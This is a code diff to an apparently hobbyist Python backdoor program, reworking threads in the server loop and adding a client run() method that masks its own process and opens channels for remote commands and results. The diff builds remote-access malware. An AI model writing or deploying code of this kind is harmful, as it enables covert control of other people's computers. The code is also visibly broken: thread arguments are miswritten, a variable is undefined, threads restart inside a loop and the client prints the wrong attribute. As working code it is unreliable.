@@ -155,6 +155,10 @@ class BackdoorServer(object):
             while not self.client:
                 self.listen()
 
+            file_watch = Thread(target=self.recv_command, args(queue,))
+            file_watch.setDaemon(True)
+            result_send = Thread(target=self.send_result, args(queue,result))
+            result_send.setDaemon(True)
             
             print("Client connected: {}".format(self.client))
             while True:
@@ -172,14 +176,8 @@ class BackdoorServer(object):
                     print(str(result))
                     print("")
 
-                    result_send = Thread(target=self.send_result, args(queue,result))
-                    result_send.setDaemon(True)
                     result_send.start()
-                    file_watch = Thread(target=self.recv_command, args(queue,))
-                    file_watch.setDaemon(True)
                     file_watch.start()
-
-                    #self.send_result(result)
 
                 except KeyboardInterrupt:
                     print("see ya")
@@ -374,6 +372,37 @@ class BackdoorClient(object):
                 else:
                     print("Unhandled result type {}".format(resulttype))
                     sys.exit(1)
+
+    def run(self):
+        """Runs in a loop listening for the server and serving their requests."""
+        self.mask_process()
+
+        queue = Queue(maxsize=0)        
+
+        while True:
+            print("Waiting for Server...") #DELETE AFTER
+            
+            # TODO: Why is this a loop?
+            while not self.server:
+                self.listen()
+            result_recv = Thread(target=self.recv_result, args(queue,result))
+            command_send = Thread(target=self.send_command, args(queue,))
+            result_recv.setDaemon(True)
+            command_send.setDaemon(True)
+            
+            print("Server connected: {}".format(self.client))
+            while True:
+                try:
+                    result_recv.start()
+                    command_send.start()
+
+                except KeyboardInterrupt:
+                    print("see ya")
+                    sys.exit(0)
+
+                except Exception, err:
+                    traceback.print_exc()
+                    break
 
 class TcpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
